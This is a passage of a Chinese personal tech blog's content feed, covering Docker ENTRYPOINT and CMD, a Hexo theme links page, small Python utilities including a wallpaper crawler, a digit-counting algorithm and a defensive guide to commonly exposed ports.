world"</span></span></span><br></pre></td></tr></table></figure><p>运行容器 <code>docker run -it [image]</code>将输出：<code>Hello world</code></p><p>但当后面加上一个命令，比如<code>docker run -it [image] /bin/bash</code>，CMD 会被<strong>忽略</strong>掉，命令 bash 将被执行：</p><p><code>root@10a32dc7d3d3:/#</code></p><h1 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h1><p><code>ENTRYPOINT</code>指令可让容器以应用程序或者服务的形式运行。</p><p><code>ENTRYPOINT</code>看上去与 CMD 很像，它们都可以指定要执行的命令及其参数。不同的地方在于 <code>ENTRYPOINT</code>不会被忽略，一定会被执行，即使运行 <code>docker run</code>时指定了其他命令。</p><p><code>ENTRYPOINT</code>有两种格式：</p><ol><li>Exec 格式：<code>ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</code>这是 ENTRYPOINT 的推荐格式。</li><li>Shell 格式：<code>ENTRYPOINT command param1 param2</code></li></ol><p>在为<code>ENTRYPOINT</code>选择格式时必须小心，因为这两种格式的效果差别很大。</p><h2 id="Exec-格式"><a href="#Exec-格式" class="headerlink" title="Exec 格式"></a>Exec 格式</h2><p><code>ENTRYPOINT</code> 的 <code>Exec</code> 格式用于设置要执行的命令及其参数，同时可通过 CMD 提供额外的参数。</p><p><code>ENTRYPOINT</code> 中的参数始终会被使用，而 CMD 的额外参数可以在容器启动时动态替换掉。</p><p>比如下面的 Dockerfile 片段：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"/bin/echo"</span>, <span class="string">"Hello"</span>]  </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"world"</span>]</span></span><br></pre></td></tr></table></figure><p>当容器通过 <code>docker run -it [image]</code> 启动时，输出为：<code>Hello world</code></p><p>而如果通过 <code>docker run -it [image] CloudMan</code>启动，则输出为：<code>Hello CloudMan</code></p><h2 id="Shell-格式"><a href="#Shell-格式" class="headerlink" title="Shell 格式"></a>Shell 格式</h2><p><code>ENTRYPOINT</code>的 <code>Shell</code>格式会忽略任何<code>CMD</code>或<code>docker run</code>提供的参数。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Indigo主题添加友链</title>
      <link href="/p/fa5b.html"/>
      <url>/p/fa5b.html</url>
      
        <content type="html"><![CDATA[<p>Indigo主题是一款HEXO的基于material设计的主题，个人比较喜欢material设计的主题，由于之前硬盘损坏且没有备份原主题<code>material</code>，于是换上了Indigo，但是没有友链功能，抽了点时间加上了。</p><a id="more"></a><h1 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a>新建文件</h1><p>首先，在<code>\hexo\blog\themes\indigo\layout</code>下新建<code>links.ejs</code>和<code>link.ejs</code></p><p>代码如下</p><p><code>links.ejs</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_partial</span>/<span class="attr">header</span>', &#123;</span></span><br><span class="line"><span class="tag">    <span class="attr">title:</span> <span class="attr">locals.title</span> || <span class="attr">theme.links_title</span>,</span></span><br><span class="line"><span class="tag">    <span class="attr">hdClass:</span> '<span class="attr">links-header</span>'</span></span><br><span class="line"><span class="tag">&#125;) %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container body-wrap fade"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.links</span> &amp;&amp; <span class="attr">theme.links.length</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"archive-separator"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">%=theme.links_title%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"waterfall"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">%</span> <span class="attr">theme.links.forEach</span>(<span class="attr">function</span>(<span class="attr">links</span>) &#123; %&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"waterfall-item"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"article-card archive-article"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"post-title"</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"post-title-link"</span> <span class="attr">href</span>=<span class="string">"&lt;%- links.url %&gt;"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">itemprop</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">%-</span> <span class="attr">links.name</span> %&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">%&#125;)%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> &#125;%&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_partial</span>/<span class="attr">paginator</span>') %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/V8UFiNW.png" alt="如图"></p><p><code>link.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%- partial(&#39;links&#39;, &#123;</span><br><span class="line">    title: theme.links_title + &#39;: &#39;+ page.tag</span><br><span class="line">&#125;) %&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/KEPMTDJ.png" alt="如图"></p><h1 id="更改CSS"><a href="#更改CSS" class="headerlink" title="更改CSS"></a>更改CSS</h1><p>然后在<code>cmd/shell</code>中执行<code>hexo new page &#39;Links&#39;</code>，然后到<code>\hexo\blog\source\Links</code>更改<code>index.md</code>为如下内容</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">layout: links</span><br><span class="line">comments: false</span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>接着在<code>\hexo\blog\themes\indigo\source\css\_partial</code>的<code>header.less</code>搜索</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tags-header</span>,</span><br><span class="line"><span class="selector-class">.categories-header</span></span><br></pre></td></tr></table></figure><p>更改为</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tags-header</span>,</span><br><span class="line"><span class="selector-class">.categories-header</span>,</span><br><span class="line"><span class="selector-class">.links-header</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/bgbVlHY.png" alt="如图"></p><h1 id="config-yml设置"><a href="#config-yml设置" class="headerlink" title="config.yml设置"></a>config.yml设置</h1><p>在<strong>主题</strong>的<code>config.yml</code>中设置<code>menu</code>项，去除<code>link</code>前面的注释</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">link:</span></span><br><span class="line">  <span class="attr">text:</span> <span class="string">测试</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/Links</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/fCmtfmQ.png" alt="如图"></p><p>在<strong>主题</strong>的<code>config.yml</code>中设置<code># 页面标题</code>项，添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links_title:</span> <span class="string">友情链接</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/Jl5iYlS.png" alt="如图"></p><p>最后，在<strong>主题</strong>的<code>config.yml</code>最后添加<code>links</code>项目，格式如下</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#友链</span></span><br><span class="line"><span class="comment">#links:</span></span><br><span class="line"><span class="comment">#  - name: 名称</span></span><br><span class="line"><span class="comment">#  - url: 链接</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"名称"</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">"链接"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"名称"</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">"链接"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"名称"</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">"链接"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"名称"</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">"链接"</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/ft1JSYE.png" alt="如图"></p><p>最终修改的文件如下<br><img src= "/img/loading.gif" data-lazy-src="/images/cDK4uAr.png" alt=""></p><p>然后<code>cmd/shell</code>执行<code>hexo g</code>重新生成页面</p><p>预览截图<br><img src= "/img/loading.gif" data-lazy-src="/images/Bgo9UZt.png" alt="预览截图"></p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批量去除后缀脚本</title>
      <link href="/p/a483.html"/>
      <url>/p/a483.html</url>
      
        <content type="html"><![CDATA[<p>批量去除一个文件夹目录下的文件后缀的脚本</p><a id="more"></a><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-03-23 23:37:27</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-03-23 23:58:22</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFileExt</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="string">''' 获取指定目录下的所有指定后缀的文件名 '''</span></span><br><span class="line"></span><br><span class="line">    f_list = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> f_list:</span><br><span class="line">        fileName=file</span><br><span class="line">        <span class="comment">#print(fileName)</span></span><br><span class="line">        file_ext=os.path.splitext(file)[<span class="number">-1</span>]</span><br><span class="line">        <span class="comment">#print(file_ext)</span></span><br><span class="line">        <span class="comment">#print(os.path.splitext(file)[0])</span></span><br><span class="line">        <span class="keyword">if</span> file_ext == <span class="string">'.下载'</span>: <span class="comment">#指定后缀</span></span><br><span class="line">            reNameFileExt(fileName)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reNameFileExt</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    <span class="string">''' 去除后缀'''</span> </span><br><span class="line">    newFileName = os.path.splitext(fileName)[<span class="number">0</span>]</span><br><span class="line">    oldFileName=path +<span class="string">'\\'</span> +fileName</span><br><span class="line">    changeFileName= path +<span class="string">'\\'</span> +newFileName</span><br><span class="line">    os.rename(oldFileName,changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    path = <span class="string">''</span></span><br><span class="line">    getFileExt(path)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wallhaven.cc 小爬虫</title>
      <link href="/p/8b64.html"/>
      <url>/p/8b64.html</url>
      
        <content type="html"><![CDATA[<p>一个月前无意中发现个壁纸站wallhaven.cc，写了个小爬虫挂服务器上了。</p><a id="more"></a><p>直接上代码吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: wallhaven.cc Spider</span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-02-12 20:20:48</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-02-12 20:40:41</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">USER_AGENTS 随机头信息</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: choice(USER_AGENTS)&#125;  <span class="comment"># 随机UA</span></span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">folder_path = <span class="string">'./photo/'</span>  <span class="comment"># 保存的图片目录</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(folder_path) == <span class="literal">False</span>:  <span class="comment"># 判断文件夹是否已经存在</span></span><br><span class="line">    os.makedirs(folder_path)  <span class="comment"># 创建文件夹</span></span><br><span class="line">MAX_TIMEOUT = <span class="number">10</span> <span class="comment">#超时时间</span></span><br><span class="line"><span class="comment">#爬取图片的个数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">999999</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"https://wallpapers.wallhaven.cc/wallpapers/full/wallhaven-"</span> + i + <span class="string">".jpg"</span></span><br><span class="line">    img_name = folder_path + <span class="string">'wallhaven-'</span> + i + <span class="string">'.jpg'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># get函数获取图片链接地址，requests发送访问请求</span></span><br><span class="line">        html = requests.get(url, headers=headers,timeout=MAX_TIMEOUT)</span><br><span class="line">        <span class="comment"># responseCode=html.status_code</span></span><br><span class="line">        httpCode = str(html.status_code)</span><br><span class="line">        <span class="comment"># print(html.status_code)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] 第 '</span> + i + <span class="string">' 张图片：'</span> + img_name + <span class="string">' 保存失败'</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="comment"># print(html.text)</span></span><br><span class="line">            <span class="keyword">with</span> open(img_name, <span class="string">'wb'</span>) <span class="keyword">as</span> file:  <span class="comment"># 以byte形式将图片数据写入</span></span><br><span class="line">                file.write(html.content)</span><br><span class="line">                file.flush()</span><br><span class="line">            print(<span class="string">'[+] '</span> + httpCode + <span class="string">' 第 '</span> + i + <span class="string">' 张图片：'</span>+img_name+<span class="string">' 保存完成'</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] 第 '</span> + i + <span class="string">' 张图片：'</span>+img_name+<span class="string">' 保存失败，CODE:'</span> + httpCode)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页码算法问题</title>
      <link href="/p/3fb0.html"/>
      <url>/p/3fb0.html</url>
      
        <content type="html"><![CDATA[<p>一道经典算法题</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><blockquote><p>给定一个十进制整数n，表示书的总页码数，计算书的页码中分别用到多少次数字0,1,2, ….,9。</p></blockquote><p>如输入:11<br>得到 :1,4,1,1,1,1,1,1,1,1<br>代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> input, i, m;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"输入总页数:\n"</span>);</span><br><span class="line">scanf_s(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= input; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = i;</span><br><span class="line"><span class="keyword">while</span> (j)</span><br><span class="line">&#123;</span><br><span class="line">a[j % <span class="number">10</span>]++;</span><br><span class="line">j = j / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d  ------&gt; %d\n"</span>, i, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>截图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/ZNfTCeU.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常见端口总结</title>
      <link href="/p/e5ba.html"/>
      <url>/p/e5ba.html</url>
      
        <content type="html"><![CDATA[<p>整理下渗透中一些常见的端口</p><a id="more"></a><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>广义方面理解电脑端口大概分为三类：公认端口、注册端口、动态或私有端口。</p><h2 id="公认端口（0-1023）"><a href="#公认端口（0-1023）" class="headerlink" title="公认端口（0-1023）"></a><strong>公认端口（0-1023）</strong></h2><p>主要用来绑定一些系统种固定的应用服务，比如之前的WannaCry利用的445端口，它其实是用于局域网内信息流通数据的端口，通俗一点就是用于文及打印共享的，算是黑客最喜欢的端口之一。</p><h2 id="注册端口（1024-49151）"><a href="#注册端口（1024-49151）" class="headerlink" title="注册端口（1024-49151）"></a><strong>注册端口（1024-49151）</strong></h2><p>松散使用的服务端口，动态使用。</p><h2 id="动态或私有端口（49512-65535）"><a href="#动态或私有端口（49512-65535）" class="headerlink" title="动态或私有端口（49512-65535）"></a><strong>动态或私有端口（49512-65535）</strong></h2><p>理论上可以不存在的，不过很多厂商还是在一些特定的应用里任性使用，比如一些路由器、IOT类产品的调试。</p><h1 id="建议在为客户运维时BAN的端口"><a href="#建议在为客户运维时BAN的端口" class="headerlink" title="建议在为客户运维时BAN的端口"></a>建议在为客户运维时BAN的端口</h1><table><thead><tr><th>端口号</th><th align="center">功能及注意事项</th></tr></thead><tbody><tr><td>69</td><td align="center"><code>TFTP</code>小型文件传输协议使用的端口。</td></tr><tr><td>135</td><td align="center"><code>RPC</code>远程过程调用使用的端口号，可以用来远程代码执行。</td></tr><tr><td>137、138、139</td><td align="center"><code>NETBIOS</code>协议应用，在局域网中提供计算机的名字或IP地址查询服务以及文件共享服务，主要用为共享开放的。</td></tr><tr><td>445</td><td align="center">上面说了用于文及打印共享服务的端口。</td></tr><tr><td>593</td><td align="center">和135其实有点像，<code>DCOM</code>使用的端口号，也可以用来使用远程代码执行。</td></tr><tr><td>1025</td><td align="center">互联网信息服务应用端口，曾被<code>NetSPY</code>木马利用过。</td></tr></tbody></table><h1 id="服务运维需要注意的端口"><a href="#服务运维需要注意的端口" class="headerlink" title="服务运维需要注意的端口"></a>服务运维需要注意的端口</h1><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>110</td><td>用于<code>POP3</code>邮件服务器使用端口，需要就做访问限制，不需要就关</td></tr><tr><td>123</td><td>网络时间协议(<code>NTP</code>)，某些老蠕虫病毒曾利用过这个端口</td></tr><tr><td>1900</td><td><code>SDP Discovery Service</code>服务，关了可以勉强防止<code>DDOS</code></td></tr><tr><td>3306</td><td><code>MySQL</code>数据库通信的默认端口，建议更改为其他端口，不对外开放或仅对个别信任地址开放</td></tr><tr><td>1433、1434</td><td><code>MSSQL</code>数据库通信的默认端口，建议同3306</td></tr><tr><td>2638、5000、4100</td><td><code>Sybase</code>数据库通信的默认端口，建议同3306</td></tr><tr><td>1521</td><td><code>Oracle</code>数据库通信的默认端口，建议同3306</td></tr><tr><td># 